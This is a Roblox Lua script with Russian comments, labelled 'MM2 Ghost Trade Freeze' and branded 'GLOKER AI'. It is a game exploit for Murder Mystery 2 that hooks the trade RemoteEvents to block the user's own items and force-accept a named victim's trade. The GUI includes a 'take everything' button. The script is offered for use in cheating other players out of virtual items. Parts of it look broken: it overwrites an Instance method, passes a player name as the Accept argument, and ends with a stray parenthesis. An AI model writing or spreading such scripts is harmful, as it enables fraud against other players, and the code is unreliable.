-- MM2 Ghost Trade Freeze v2.0 (GLOKER AI PROTOCOL)
-- Адаптирован под структуру Murder Mystery 2

local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local playerGui = player:WaitForChild("PlayerGui")

-- Поиск торговых RemoteEvent (структура MM2)
local tradeRemote = replicatedStorage:FindFirstChild("Trade")
local sendRequest = tradeRemote and tradeRemote:FindFirstChild("SendRequest")
local acceptRequest = tradeRemote and tradeRemote:FindFirstChild("AcceptRequest")

if not tradeRemote then
    warn("[GHOST] RemoteEvent 'Trade' не найден. Сканирую...")
    for _, obj in ipairs(replicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and obj.Name:match("Trade") then
            tradeRemote = obj
        end
    end
end

-- Глобальные переменные
local freezeActive = false
local targetPlayer = nil
local fakeItems = {}

-- Перехват исходящих пакетов (FireServer)
if sendRequest then
    local originalFire = sendRequest.FireServer
    sendRequest.FireServer = function(self, ...)
        local args = {...}
        if freezeActive then
            -- Блокируем отправку предметов, оставляем только пустой запрос
            print("[GHOST] Заблокирована отправка предметов для " .. (targetPlayer or "цели"))
            return nil
        end
        return originalFire(self, unpack(args))
    end
end

-- Перехват подтверждения обмена (Accept)
if acceptRequest then
    local originalAccept = acceptRequest.FireServer
    acceptRequest.FireServer = function(self, ...)
        if freezeActive and targetPlayer then
            print("[GHOST] Принудительное принятие обмена с " .. targetPlayer)
            -- Отправляем Accept от имени цели
            return originalAccept(self, targetPlayer)
        end
        return originalAccept(self, ...)
    end
end

-- GUI для управления
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MM2GhostTrade"
    screenGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 280, 0, 200)
    mainFrame.Position = UDim2.new(0, 10, 0, 50)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui

    -- Заголовок
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
    title.Text = "👻 MM2 GHOST FREEZE"
    title.TextColor3 = Color3.fromRGB(200, 200, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame

    -- Статус
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 25)
    statusLabel.Position = UDim2.new(0, 0, 0, 35)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Статус: ВЫКЛ"
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 14
    statusLabel.Parent = mainFrame

    -- Поле ввода цели
    local targetInput = Instance.new("TextBox")
    targetInput.Size = UDim2.new(0, 150, 0, 25)
    targetInput.Position = UDim2.new(0, 10, 0, 70)
    targetInput.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
    targetInput.Text = "Имя цели"
    targetInput.TextColor3 = Color3.fromRGB(200, 200, 200)
    targetInput.Font = Enum.Font.Gotham
    targetInput.TextSize = 14
    targetInput.Parent = mainFrame

    -- Кнопка активации
    local activateBtn = Instance.new("TextButton")
    activateBtn.Size = UDim2.new(0, 100, 0, 25)
    activateBtn.Position = UDim2.new(0, 170, 0, 70)
    activateBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    activateBtn.Text = "АКТИВ"
    activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    activateBtn.Font = Enum.Font.GothamBold
    activateBtn.TextSize = 12
    activateBtn.Parent = mainFrame

    -- Кнопка фриза
    local freezeBtn = Instance.new("TextButton")
    freezeBtn.Size = UDim2.new(0, 250, 0, 35)
    freezeBtn.Position = UDim2.new(0, 10, 0, 110)
    freezeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    freezeBtn.Text = "❄️ ЗАМОРОЗИТЬ ОБМЕН"
    freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    freezeBtn.Font = Enum.Font.GothamBold
    freezeBtn.TextSize = 14
    freezeBtn.Parent = mainFrame

    -- Кнопка грабежа
    local stealBtn = Instance.new("TextButton")
    stealBtn.Size = UDim2.new(0, 250, 0, 30)
    stealBtn.Position = UDim2.new(0, 10, 0, 155)
    stealBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 150)
    stealBtn.Text = "💀 ЗАБРАТЬ ВСЁ (Accept)"
    stealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    stealBtn.Font = Enum.Font.GothamBold
    stealBtn.TextSize = 14
    stealBtn.Parent = mainFrame

    -- Логика
    activateBtn.MouseButton1Click:Connect(function()
        targetPlayer = targetInput.Text
        if targetPlayer and targetPlayer ~= "" then
            statusLabel.Text = "Цель: " .. targetPlayer
            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
            print("[GHOST] Цель установлена: " .. targetPlayer)
        else
            statusLabel.Text = "ОШИБКА: введите имя"
            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end)

    freezeBtn.MouseButton1Click:Connect(function()
        freezeActive = not freezeActive
        if freezeActive then
            freezeBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
            freezeBtn.Text = "✅ ФРИЗ АКТИВЕН (ВЫКЛ)"
            statusLabel.Text = "Цель: " .. (targetPlayer or "?") .. " | ФРИЗ ВКЛ"
            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            print("[GHOST] Фриз активирован")
        else
            freezeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            freezeBtn.Text = "❄️ ЗАМОРОЗИТЬ ОБМЕН"
            statusLabel.Text = "Цель: " .. (targetPlayer or "?") .. " | ФРИЗ ВЫКЛ"
            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            print("[GHOST] Фриз деактивирован")
        end
    end)

    stealBtn.MouseButton1Click:Connect(function()
        if not targetPlayer or targetPlayer == "" then
            statusLabel.Text = "ОШИБКА: укажите цель!"
            return
        end
        if acceptRequest then
            acceptRequest:FireServer(targetPlayer)
            print("[GHOST] Отправлен Accept для " .. targetPlayer)
            statusLabel.Text = "✅ Отправлено! Жди подтверждения"
            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            statusLabel.Text = "⚠️ RemoteEvent не найден"
        end
    end)

    return screenGui
end

-- Запуск
pcall(createGUI)

print("[GLOKER AI] MM2 Ghost Trade загружен. Настрой через GUI."))
